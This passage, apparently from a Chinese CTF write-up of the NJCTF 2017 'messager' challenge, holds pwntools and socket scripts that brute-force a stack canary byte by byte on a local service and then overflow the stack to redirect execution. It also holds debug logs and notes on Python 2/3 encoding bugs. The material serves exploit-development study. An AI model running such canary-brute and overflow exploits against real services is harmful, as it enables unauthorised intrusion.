class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# sh = process(&amp;quot;./messager&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;splitw&amp;#x27;, &amp;#x27;-h&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;break *0x8048e96&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#print(j)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    j = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(j).encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;latin-1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.send(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ret = s.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;(ret))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#if &amp;quot;Message received&amp;quot; in ret:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;Message received!&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ret:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;success&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		但是有时候都进去输出success了 还是不能break,这是为啥. 把这两行给注释掉就可以了….为什么???&lt;/p&gt;
&lt;p&gt;​		我猜是产生报错了.an integer is required (got type bytes) 果然!! chr(j)是不行的&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;  &lt;span class=&#34;string&#34;&gt;b&amp;quot;Message received!&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ret:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;#print(&amp;quot;success&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;comment&#34;&gt;#canary += chr(j)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		各种各样编码的问题……..真的很奇怪诶…要怎么样才能避免呢?&lt;/p&gt;
&lt;p&gt;然后爆破出一位canary了之后,继续爆破,爆破完了之后就可以栈溢出了&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://e3pem.github.io/2018/09/30/NJCTF2017/&#34;&gt;https://e3pem.github.io/2018/09/30/NJCTF2017/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果正常的话,会返回messager received&lt;/p&gt;
&lt;p&gt;为啥一直爆破不成功呢,很奇怪 为什么python2就可以呢? 为什么python3不行呢……..&lt;/p&gt;
&lt;p&gt;对比一下后端接收到的看一下&lt;/p&gt;
&lt;p&gt;Python2: Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcsfd &amp;#x3D; 5&lt;/p&gt;
&lt;p&gt;success&lt;br&gt;this is34&lt;br&gt;“&lt;/p&gt;
&lt;p&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;this is30&lt;br&gt;\x1e&lt;br&gt;[*] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;this is31&lt;br&gt;\x1f&lt;/p&gt;
&lt;p&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00&lt;br&gt;this is32&lt;/p&gt;
&lt;p&gt;[&lt;em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00&lt;br&gt;this is33&lt;br&gt;!&lt;br&gt;[&lt;/em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00&lt;br&gt;this is34&lt;br&gt;“&lt;/p&gt;
&lt;p&gt;python3:&lt;/p&gt;
&lt;p&gt;Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA””&amp;#96;*** stack smashing detected ***: &lt;unknown&gt; terminated&lt;/unknown&gt;&lt;/p&gt;
&lt;p&gt;感觉这里多了点东西?是的,为什么python2这里不显示呢?&lt;/p&gt;
&lt;p&gt;这是第30个&lt;br&gt;\x1e&lt;br&gt;[&lt;em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;这是第31个&lt;br&gt;\x1f&lt;br&gt;[&lt;/em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;这是第32个&lt;/p&gt;
&lt;p&gt;[&lt;em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;这是第33个&lt;br&gt;!&lt;br&gt;[&lt;/em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;这是第34个&lt;br&gt;“&lt;/p&gt;
&lt;p&gt;b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1f’&lt;br&gt;这是第31个&lt;br&gt;\x1f&lt;br&gt;[*] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ‘&lt;br&gt;这是第32个&lt;/p&gt;
&lt;p&gt;[&lt;em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!’&lt;br&gt;这是第33个&lt;br&gt;!&lt;br&gt;[&lt;/em&gt;] Closed connection to 127.0.0.1 port 5555&lt;br&gt;[+] Opening connection to 127.0.0.1 on port 5555: Done&lt;br&gt;b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA”‘&lt;br&gt;这是第34个&lt;br&gt;“&lt;/p&gt;
&lt;p&gt;python2版本exp,这个的话,是只有io.recv()接收到了信息,才会往下执行,不然就走except了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;brute_canary&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; xrange(&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;): &lt;span class=&#34;comment&#34;&gt;# 2 ** 8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + canary + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            canary += &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;success&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;this is&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;: &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;finally&lt;/span&gt;: io.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.send(&lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; + canary + &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x400BC6&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; io.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    brute_canary()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pwn()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;错误的python3&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;leak_canary&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.connect((&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        senddata = &lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;104&lt;/span&gt; +  &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(i),&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#print(senddata)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;这是第&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i)+&lt;span class=&#34;string&#34;&gt;&amp;quot;个&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        io.send(senddata)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data = io.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Message received&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; data:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;success&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;#代表这一位已经爆破成功,跳出后进行下一位爆破&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;finally&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            io.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5555&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(io.recvline())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    leak_canary()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pwn()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

